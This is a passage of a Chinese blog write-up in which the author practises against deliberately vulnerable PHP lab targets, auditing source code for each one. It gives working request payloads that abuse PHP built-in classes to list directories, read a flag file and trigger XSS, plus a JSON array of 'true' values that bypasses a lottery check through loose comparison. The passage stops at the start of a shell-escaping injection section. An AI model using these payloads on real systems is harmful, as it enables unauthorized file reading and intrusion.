+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117Y8Y4Lk.png" alt="image-20231023104555813"></p>
+<p>当测试name&#x3D;1时发现有回显</p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117k0w5ge.png" alt="image-20231023104901356"></p>
+<p>但不论测试什么值，都显示404，前后说明nume参数肯定存在，要么是值不对，要么就是还有其他参数，值的话只能从类型下手，字符串和数字均尝试了，依然回显404，进行不下去，其他参数更不用说了，参数名想都不用想没源码直接放弃，或者猜一下常见的参数名，ID，type，user，name，passwd，phone等等。简单测试一些就OK。</p>
+<p>只有通过代码白盒测试了</p>
+<h3 id="白盒测试-1"><a href="#白盒测试-1" class="headerlink" title="白盒测试"></a>白盒测试</h3><p>打开容器查看源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(</span><br><span class="line">    function (<span class="variable">$class</span>)&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">NotFound</span>();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$classname</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param2</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$classname</span>))&#123;</span><br><span class="line">    <span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$newclass</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$newclass</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码可以看出，确实有name参数，但还有两个参数，这个不好猜测。这里有一些代码其实不知道啥意思，我直接扔给gpt解读一下（虽然gpt在很多方面很垃圾，但是解释我们不认识的代码还是ok的）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class NotFound 定义了一个名为 NotFound 的PHP类，该类包含一个构造函数 __construct()，当这个类的实例被创建时，它会终止脚本并输出 &quot;404&quot;。</span><br><span class="line"></span><br><span class="line">spl_autoload_register 函数用于注册一个自动加载函数。在这里，它注册了一个匿名函数，当代码尝试加载一个不存在的类时，将创建一个 NotFound 类的实例。这意味着如果在后续代码中尝试实例化一个不存在的类，将会触发这个自动加载函数，终止脚本并输出 &quot;404&quot;。</span><br><span class="line"></span><br><span class="line">$classname 从 $_GET 请求参数中获取，如果 $_GET[&#x27;name&#x27;] 存在，将赋值给 $classname。这段代码似乎期望通过 URL 查询参数指定要实例化的类名。</span><br><span class="line"></span><br><span class="line">同样，$param 和 $param2 也是从 $_GET 请求参数中获取的，它们用于在尝试实例化类时传递给类的构造函数作为参数。</span><br><span class="line"></span><br><span class="line">接下来，代码检查是否通过 class_exists 函数检测到的 $classname 存在，如果存在，将尝试创建一个新的类实例，使用 $param 和 $param2 作为构造函数参数。然后，它使用 var_dump 输出新创建的类实例的信息，并尝试使用 foreach 遍历该类实例的属性（成员变量），将属性名和属性值输出到浏览器。</span><br></pre></td></tr></table></figure>
+
+<p>看了这个gpt的解释，大概也能看明白怎么去寻找漏洞了，这里也解释了为什么我黑盒测试的时候，显示404，当我name&#x3D;1时，spl_autoload_register函数判断1是不存在的类，所以要绕过这个限制就就要去找php的内置类，而且还要可以利用内置类来进行操作的，参考了一下网上的内置类利用，<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2288295?areaId=106001">PHP 常见内置类浅析-腾讯云开发者社区-腾讯云 (tencent.com)</a>，找到了比较全的。</p>
+<p>摘取了一下整合的目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">XSS By Error/Exception</span><br><span class="line">	Error</span><br><span class="line">	Exception</span><br><span class="line">SSRF By SoapClient</span><br><span class="line">	demo</span><br><span class="line">文件读取</span><br><span class="line">	SplFileObject</span><br><span class="line">	SimpleXmlElement（转为xxe利用php://伪协议）</span><br><span class="line">遍历目录</span><br><span class="line">	FilesystemIterator（支持glob协议）</span><br><span class="line">	DirectoryIterator（支持glob和file协议）</span><br><span class="line">	GlobIterator</span><br></pre></td></tr></table></figure>
+
+<p>白盒测试一些这些内置类。成功执行的有GlobIterator，FilesystemIterator，这两个都是遍历目录的，其他两个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=FilesystemIterator&amp;param=./&amp;param2=0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117mRlc1d.png" alt="image-20231023153239488"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=GlobIterator&amp;param=./*&amp;param2=0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117JYtr5l.png" alt="image-20231023153024060"></p>
+<p>可以发现FilesystemIterator只需要传入目录名就行，而且测试发现他支持..&#x2F;跨越目录进行查找。而GlobIterator则是模糊搜索，感觉类似于find命令进行匹配。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=Exception&amp;param=&lt;script&gt;alert(%27xss%27)&lt;/script&gt;&amp;param2=0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117iNBCoP.png" alt="image-20231023160320553"></p>
+<p>测试了一下其他的类，也是可以执行的，这里靶场环境是php5.6，有的内置类需要特定版本，比如Error只有PHP7才有。有的payload就不行。</p>
+<p>现在可以尝试获取文件的内容，网上的资料显示使用SplFileObject类进行文件读取，尝试一下发现不行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=SplFileObject&amp;param=f1agi3hEre.php&amp;param2=0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117nCoig5.png" alt="image-20231023162258677"></p>
+<p>php版本是OK的，但是不知道什么原因无法读取。</p>
+<p>（两天后更新）找到了原因，因为传递的参数不对，SplFileObject($file,$method),所以需要传入参数 r</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=SplFileObject&amp;param=f1agi3hEre.php&amp;param2=r</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117XdN5fv.png" alt="image-20231027100202471"></p>
+<p>查看别人的思路，使用SimpleXMLElement可以进行xxe然后读取文件内容。但是发现其实不存在这个类因为如果存在这个内置类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117OC7813.png" alt="image-20231027100348457"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117Maj1gQ.png" alt="image-20231027100435163"></p>
+<p>前后的返回是不一样的。所以我上传了一个脚本查看此版本php的内置类。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span>    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>运动后发现没有simplexmlelement这个内置类。</p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>如果代码中自动加载一些函数，调用内置类的时候，我们可以利用内置类的特点来实现对漏洞的利用，此处成功实验了文件遍历，文件读取，xss的，最主要的是知道怎么查找内置类了。所以实例化内置类，利用内置类的特性，传入特定参数，是可以发现很多漏洞的。</p>
+<h2 id="day4-弱类型比较"><a href="#day4-弱类型比较" class="headerlink" title="day4-弱类型比较"></a>day4-弱类型比较</h2><h3 id="黑盒测试-2"><a href="#黑盒测试-2" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>开始测试，发现这是一个猜字游戏，就像双色球，先注册一个账号，有20分，才一次2分，注册的时候想测试一下sql注入，但前后返回没有差别，判断为没有SQL注入，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117mZ3Qqa.png" alt="image-20231122154019065"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117Rrzkiq.png" alt="image-20231122154048092"></p>
+<p>flag可以购买，想着看看能不能通过修改请求包试试发现不行，设置了cookie，cookie关联账户积分</p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117aw5xBS.png" alt="image-20231122155112979"></p>
+<p>翻看了功能点没有挖掘的思路，感觉应该是修改money的值或者是绕过中奖号码的比对，前者或许就是修改前后返回包，类似逻辑漏洞的测试方法，后者可能是弱类型的比较，尝试在前端直接传入aaaaaaa，但测试aaaaaaa发现参数不合法。没其他想法了。</p>
+<h3 id="白盒测试-2"><a href="#白盒测试-2" class="headerlink" title="白盒测试"></a>白盒测试</h3><p>上机查看源代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117YV47gD.png" alt="image-20231124154821502"></p>
+<p>这是此靶场的文件目录，翻阅发现主要功能点就是api.php这个文件，发现主要有一个data参数来控制数据的传输</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] != <span class="string">&#x27;POST&#x27;</span> || !<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>] != <span class="string">&#x27;application/json&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">response_error</span>(<span class="string">&#x27;please post json data&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">json_last_error</span>() != JSON_ERROR_NONE)&#123;</span><br><span class="line">	<span class="title function_ invoke__">response_error</span>(<span class="string">&#x27;invalid json&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">require_keys</span>(<span class="variable">$data</span>, [<span class="string">&#x27;action&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>data必须是json格式数据，整个api文档主要有三个函数 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="variable">$data</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;buy&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">require_keys</span>(<span class="variable">$data</span>, [<span class="string">&#x27;numbers&#x27;</span>]);</span><br><span class="line">		<span class="title function_ invoke__">buy</span>(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;flag&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">flag</span>(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;register&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">require_keys</span>(<span class="variable">$data</span>, [<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">		<span class="title function_ invoke__">register</span>(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="title function_ invoke__">response_error</span>(<span class="string">&#x27;invalid request&#x27;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看了一下代码，感觉有漏洞点的就是一个buy函数，还有那个file_get_contents(),这个函数是一般是任意文件读取的时候会出现的，看了网上的文章，漏洞果然是弱类型的比较去绕过彩票的比对。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">require_registered</span>();</span><br><span class="line">	<span class="title function_ invoke__">require_min_money</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="variable">$numbers</span> = <span class="variable">$req</span>[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">	<span class="variable">$win_numbers</span> = <span class="title function_ invoke__">random_win_nums</span>();</span><br><span class="line">	<span class="variable">$same_count</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">			<span class="variable">$same_count</span>++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$same_count</span>) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">20</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">300</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">1800</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">200000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5000000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$money</span> += <span class="variable">$prize</span> - <span class="number">2</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">	<span class="title function_ invoke__">response</span>([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;numbers&#x27;</span>=&gt;<span class="variable">$numbers</span>, <span class="string">&#x27;win_numbers&#x27;</span>=&gt;<span class="variable">$win_numbers</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>, <span class="string">&#x27;prize&#x27;</span>=&gt;<span class="variable">$prize</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在if判断的时候是&#x3D;&#x3D;，存在弱类型比较，但是他其实有限制的，一个是在前端输入的时候，除了数字，不能输入其他的，</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(input.<span class="property">validity</span>.<span class="property">valid</span>)&#123;</span><br><span class="line">		<span class="keyword">var</span> numbers = input.<span class="property">value</span>;</span><br><span class="line">		$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">		  <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">		  <span class="attr">url</span>: <span class="string">&quot;api.php&quot;</span>,</span><br><span class="line">		  <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">		  <span class="attr">contentType</span>: <span class="string">&quot;application/json&quot;</span>, </span><br><span class="line">		  <span class="attr">data</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">action</span>: <span class="string">&quot;buy&quot;</span>, <span class="attr">numbers</span>: numbers &#125;)</span><br><span class="line">		&#125;).<span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params">resp</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(resp.<span class="property">status</span> == <span class="string">&#x27;ok&#x27;</span>)&#123;</span><br><span class="line">				<span class="title function_">show_result</span>(resp);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="title function_">alert</span>(resp.<span class="property">msg</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="title function_">alert</span>(<span class="string">&#x27;invalid&#x27;</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是前端的过滤，通过if的判断是否输入为数字，来进行过滤，这个只需要抓包就能绕过，然后是后端的json格式的过滤，其实严格来说这俩都不是过滤，因为只是因为我自己的知识不够，我把他认作是一种过滤，因为在前面已经提到，后端代码是通过传过来的json代码来进行处理数据的，data会判断是否为json，是的话就进行处理。通过网上的方法，知道了直接传入一个数组就ok了，数组值能绕过弱类型比较就行。复习一下弱类型比较，弱类型是将前面类型转换后进行比较，转换等号前面的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">true</span> == <span class="number">1</span>);  <span class="comment">//boolean true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">true</span> == <span class="number">8</span>);  <span class="comment">//boolean true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">true</span> == <span class="number">0</span>);  <span class="comment">//boolean false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(aa == <span class="number">1</span>);	<span class="comment">//boolean false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(aa == <span class="number">0</span>);	<span class="comment">//boolean true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(a1 == <span class="number">0</span>);	<span class="comment">//boolean true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(NUll == <span class="number">0</span>);	<span class="comment">//boolean true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">false</span> == <span class="number">0</span>);	<span class="comment">//boolean true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以想要绕过比对只需要使每一个比对都成立，payload传入一个数组，使其全部为true即可。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;action&quot;</span><span class="punctuation">:</span><span class="string">&quot;buy&quot;</span><span class="punctuation">,</span><span class="attr">&quot;numbers&quot;</span><span class="punctuation">:</span></span><br><span class="line"><span class="punctuation">[</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>还在思考弱类型是否还有其他的值可以绕过，但看到这个php官方手册解释</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含&#x27;.&#x27;,&#x27;e&#x27;,&#x27;E&#x27;并且其数值值在整形的范围之内</span><br><span class="line">该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>对于存在条件语句的地方，均可以作为漏洞的测试点，判断好条件后，看看是否有其他的值能绕过正常的判断。还有就是自己最开始的挖掘漏洞的思路是没有问题的，就是需要坚持走下去，一定要对自己的思路有自信。</p>
+<h2 id="day5-escapeshellarg-和-escapeshellcmd注入漏洞"><a href="#day5-escapeshellarg-和-escapeshellcmd注入漏洞" class="headerlink" title="day5-escapeshellarg 和 escapeshellcmd注入漏洞"></a>day5-escapeshellarg 和 escapeshellcmd注入漏洞</h2><h3 id="黑盒测试-3"><a href="#黑盒测试-3" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>访问网站后即发现为一个php代码文件，看来直接可以白盒审计</p>
+<p><img src="https://cdn.jsdelivr.net/gh/China-natian/China-natian.github.io@main/image/0117YXz2xP.png" alt="image-20231226103647473"></p>
+<h3 id="白盒测试-3"><a href="#白盒测试-3" class="headerlink" title="白盒测试"></a>白盒测试</h3><p>通读代码大概理解了一下就是有一个waf函数，过滤传递的flag参数，并且过滤大小写,对preg_match还不是很理解，搜了一下</p>
+<p><code>preg_match()</code> 是 PHP 中用于进行正则表达式匹配的函数之一。它用于检查一个字符串是否与给定的正则表达式模式匹配。</p>
+<p>这个函数的基本语法是：</p>
+<p><code>preg_match(pattern, subject, matches);</code></p>
+<ul>
+<li><p><code>pattern</code> 是你想要匹配的正则表达式模式。</p>
+</li>
+<li><p><code>subject</code> 是待检查的字符串。</p>
+</li>
+<li><p><code>matches</code> 是一个可选参数，用于存储匹配到的结果。</p>
